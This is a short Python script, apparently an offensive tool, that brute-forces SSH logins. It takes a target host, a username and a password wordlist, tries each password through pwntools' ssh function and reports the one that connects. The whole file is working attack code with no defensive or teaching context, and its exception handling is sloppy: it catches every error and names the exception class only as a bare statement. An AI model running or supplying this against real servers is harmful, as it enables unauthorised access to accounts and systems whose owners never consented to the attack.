from pwn import *
import paramiko
import sys

#argv[1] = host (ex.127.0.0.1)
host = str(sys.argv[1])
#argv[2] = username (ex.root)
username = str(sys.argv[2])
attempts = 0


#Open file with read permissions 
# argv[3] = file (ex. /etc/passwd)
with open(str(sys.argv[3]), "r") as password_list:
  for password in password_list:
    password = password.strip("\n") #Stripping password
    try: 
      print("Trying: {}".format(password))
      #Utilizing ssh function from pwn library
      response = ssh(host=host, user=username, password=password, timeout=1) 
      #If the connection is successful
      if response.connected: 
        print("[+] Password found: {}".format(password))
        response.close()
        break
      #Closing if no response
      response.close() 
    except:
      paramiko.ssh_exception.AuthenticationException
      print("[-] Password not found: {}".format(password))
    attempts += 1